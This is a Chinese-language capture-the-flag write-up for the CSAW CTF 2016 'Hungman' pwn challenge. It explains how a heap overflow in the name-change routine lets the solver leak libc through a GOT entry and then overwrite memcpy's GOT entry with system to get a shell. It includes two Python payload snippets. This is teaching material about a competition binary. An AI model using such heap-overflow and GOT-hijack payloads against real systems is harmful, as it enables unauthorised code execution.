# [CSAW CTF 16] Hungman 300

> Category: pwn		
> Point: 300	
> Solver: nae @ BambooFox	
> 第一次貢獻大分數給 BambooFox，雖然這次比賽比較簡單，但還是很感動QQ

64 bit ELF, NX, Partial RELRO, Stack Canary, no PIE

程式一開始會要求輸入名字，而他會 `malloc` 名字長度的記憶體來存放使用者輸入的名字，接著會 `malloc` 一塊 0x80 大小的 heap，以下稱之為 `key_heap`，第一格**高位** 4 bytes 會存放 length of name，第二格則儲存著 name's heap 的位址。

name's heap & key_heap 的 memory layout 如下：

	low     ->     high
	+ ------------- +  name's heap chunk head
	| previous size |
	| ------------- |
	|      size     |
	| ------------- |
	|      name     |  32 bytes
	|               |		|
	|               |		|
	|               |		v
	+ ------------- +  key_heap chunk head
	| previous size |
	| ------------- |
	|      size     |
	| ------------- |
	|       |length |
	| ------------- |
	|  name's heap  |
	+ ------------- +

輸入完名字之後，回到了 `main`，接著便進入玩遊戲的 function 以下稱為 game。

遊戲是猜小寫英文字母，然後如果分數超過 64 分可以重新改名字，而改寫名字時可以在 heap 上進行 overflow。

因為是猜小寫字母，而照他的規則一開始輸入名字的長度
決定可以猜的次數，因此一開始輸入名字時就給他來個 `'A'*26`，這樣基本上從 a 猜到 z 猜到一半就能夠破分數紀錄而改寫名字。

改寫名字的 code 重點如下：

~~~c
s = malloc(248);
memset(s, 0, 248);
len_of_new_name = read(0, s, 248);
*(_DWORD*)(a1 + 4) = len_of_new_name; // 把剛剛 key_heap 存 name size 的地方改成 new name 的 size
memcpy(*(void**)(a1 + 8), s, len_of_new_name);
free(s);
~~~
	
由上面的 code 可以發現，他最長可以讀 248 bytes，而我們一開始輸入的名字長度只有 26，因此 new name 可以好好的構造來 **leak information**。

因為離開 game 後會把新名字 dump 出來，而程式找 `name_heap` 的方式是靠 `key_heap` 的第二格來找，因此在剛剛的 overflow 時我們將原本儲存著 name's heap address 的那格改成 GOT entry，這樣一來，在 dump new name 的時候便可以 **leak libc information** 接著利用主辦方給的 libc 就可以找到 `libc base`。

這邊 overflow 的 payload 如下：

~~~python
payload = 'A'*32 # padding
payload += p64(0) # previous size
payload += p64(0x91) # size
payload += p32(0x20) # score
payload += p32(0x1b) # len_of_new_name
payload += p64(libc_start_main) # __libc_start_main GOT entry
~~~

size 那邊沒必要寫壞就寫回原來的值，下一格的**低位** 4 bytes 會是 這次刷新的分數(下面提供相關 code)，為了加速下次玩遊戲時間，把分數改低一點，然後因為猜個 26 次就很夠了所以**高位** 4 bytes 寫回原來的長度就好了，接下來再玩一次。

~~~c
score = *(_DWARD*)a1;
~~~

第二次改名時就不會改到 name's heap，會改到剛剛 overwrite 的 `__libc_start_main` GOT entry 上。

GOT table 的 libc function order:

	__libc_start_main@got.plt
	__gmon_start__@got.plt
	memcpy@got.plt
	malloc@got.plt
	setvbuf@got.plt
	
因為在改名字時有一段 code 是 `memcpy(*(void**)(a1+8), s, len_of_new_name)`，所以把 `memcpy` 的 GOT hijack 掉改成 `system`，要注意的點是改名字時會用到 `malloc` 而 `read` 會在結尾補 `\x00` 所以乾脆直接連 `malloc` 也一起蓋正確的 `libc address` 確保他不會壞，而 `malloc` 的下一個 function 後面用不到就不用管他。這邊 payload 開頭我就先送 `'sh\x00'` 上去這樣 `memcpy` 的一開始就可以直接 `system('sh')`。

第二次的 payload:

~~~python
payload = "sh\x00".ljust(8)
payload += 'A'*8
payload += p64(system)
payload += p64(malloc)
~~~

之後再玩一次遊戲，然後改名字的時候隨便輸入就可以拿到 shell。

	


